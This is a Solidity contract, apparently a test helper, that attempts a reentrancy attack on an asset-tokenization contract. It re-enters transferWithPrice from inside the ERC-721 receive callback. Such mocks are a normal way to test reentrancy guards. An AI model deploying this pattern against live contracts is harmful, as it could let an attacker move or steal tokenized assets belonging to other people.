// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAssetTokenization {
    function transferWithPrice(address from, address to, uint256 assetId, uint256 price) external;
}

contract ReentrancyAttacker {
    IAssetTokenization public target;
    bool public attacking;
    
    constructor(address _target) {
        target = IAssetTokenization(_target);
    }
    
    function attack(uint256 assetId, address to, uint256 price) external {
        attacking = true;
        // Try to reenter transferWithPrice
        target.transferWithPrice(address(this), to, assetId, price);
        attacking = false;
    }
    
    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes memory
    ) external returns (bytes4) {
        if (attacking) {
            // Try to reenter during the transfer callback
            target.transferWithPrice(address(this), msg.sender, tokenId, 0);
        }
        return this.onERC721Received.selector;
    }
}

